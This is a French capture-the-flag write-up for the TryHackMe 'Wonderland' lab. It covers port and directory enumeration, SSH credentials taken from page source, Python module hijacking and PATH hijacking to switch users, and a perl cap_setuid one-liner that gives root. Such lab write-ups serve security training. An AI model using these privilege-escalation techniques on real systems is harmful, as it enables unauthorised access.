# Wonderland

![fdba6eaf85513262b2a9b12875b0f342(2)](https://user-images.githubusercontent.com/68467919/207438998-d5969836-4f23-4aa1-a4ad-f313eb392de5.jpeg)

## Énumération

### NMAP

```php
sudo nmap -sC -sV -O -oN enum/nmap -vv $ip

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8eeefb96cead70dd05a93b0db071b863 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a927944164f204350a9a847e2c2be84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 000b8044e63d4b6947922c55147e2ac9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Feroxbuster

```php
feroxbuster -u http://10.10.205.166/ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

301      GET        0l        0w        0c http://10.10.205.166/img => img/
200      GET       10l       44w      402c http://10.10.205.166/
301      GET        0l        0w        0c http://10.10.205.166/r => r/
301      GET        0l        0w        0c http://10.10.205.166/r/a => a/
301      GET        0l        0w        0c http://10.10.205.166/r/a/b => b/
301      GET        0l        0w        0c http://10.10.205.166/r/a/b/b => b/
```

## Port 80 | HTTP

En suivant les différents répertoires */r/a/b/b/i/t* nous tombons sur cette page : 

![Untitled](https://user-images.githubusercontent.com/68467919/207439058-933ea372-510e-4962-8e8c-db55a1d13cbf.png)

En regardant le code-source, nous obtenons des creds pour se connecter en SSH sur la session d’alice.

```bash
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

### Alice | SSH

En étant connecté à la session d’Alice, nous pouvons faire un sudo -l pour voir quels scripts nous pourrions exécuter à la place d’un autre utilisateur.

![Untitled 1](https://user-images.githubusercontent.com/68467919/207439082-d6ea7661-5723-4160-a4cb-5fb131a7b5c8.png)

Nous pouvons donc exécuter le script walrus_and_the_carpenter.py en tant que l’utilisateur rabbit.

*walrus_and_the_carpenter.py*

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

[...]

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Nous remarquons que le script import le module *random* et appel la fonction *choice*. Si nous créons notre propre random nous pourrions exécuter n’importe quelle commande lors de l’exécution du script.

Dans */home/alice*, nous créons donc un script nommé *random.py* avec le contenu ci-dessous :

```python
import os

def choice(x):
	os.system('/bin/bash')
```

![Untitled 2](https://user-images.githubusercontent.com/68467919/207439102-c4d76018-9be8-48ca-a1a0-c33ecd3d2417.png)

Le script fait donc bien appel à notre *random.py* qui se trouve dans /home/alice

## Rabbit

Dans le home de Rabbit, un fichier teaParty est présent. En utilisant la commande file, nous pourrions en connaître un peu plus sur le type de ce fichier.

```bash
file teaParty

teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```

Je décide donc de télécharger ce fichier sur ma machine en faisant un serveur web sur la session sur laquelle nous sommes.

```bash
rabin2 -z teaParty

[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x00002008 59  60   .rodata ascii Welcome to the tea party!\nThe Mad Hatter will be here soon.
1   0x00002048 0x00002048 57  58   .rodata ascii /bin/echo -n 'Probably by ' && date --date='next hour' -R
2   0x00002088 0x00002088 68  69   .rodata ascii Ask very nicely, and I will give you some tea while you wait for him
3   0x000020d0 0x000020d0 32  33   .rodata ascii Segmentation fault (core dumped)
```

En utilisant *ltrace*, nous pouvons voir les différents appels que fait le fichier.

```bash
ltrace ./teaParty

setuid(1003)                                                            = -1
setgid(1003)                                                            = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)                            = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Tue, 13 Dec 2022 22:24:16 +0100
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                  = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)                             = 69
getchar(0x7f82ff48ea10, 1, 1, 0x7f82ff3b20d0
```

En vérifiant dans /etc/passwd à quel uid appartient 1003, nous voyons qu’il appartient à l’utilisateur hatter.

```bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
```

Nous voyons ici que le script utilise la commande echo et date. Comme pour Alice, si nous parvenons à créer notre propre date, nous pourrions peut-être devenir l’utilisateur Hatter

### Path Hijacking

```bash
nano /tmp/date

#!/bin/bash

/bin/bash
```

```bash
PATH=/tmp/:$PATH
```

![Untitled 3](https://user-images.githubusercontent.com/68467919/207439127-587989d3-2053-46ea-9ca5-34052366aa51.png)

## Root

Après avoir énuméré les différentes façon dont nous pourrions élevé nos privilèges avec linpeas.sh, nous pouvons remarquer qu’un captabilities est set sur le binaire perl.

```bash
/usr/bin/perl = cap_setuid+ep
```

En allant sur GTFOBins, nous pouvons voir que l’exploit si dessous fonctionne pour s’élever en privilège.
https://gtfobins.github.io/gtfobins/perl/

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

ROOTED
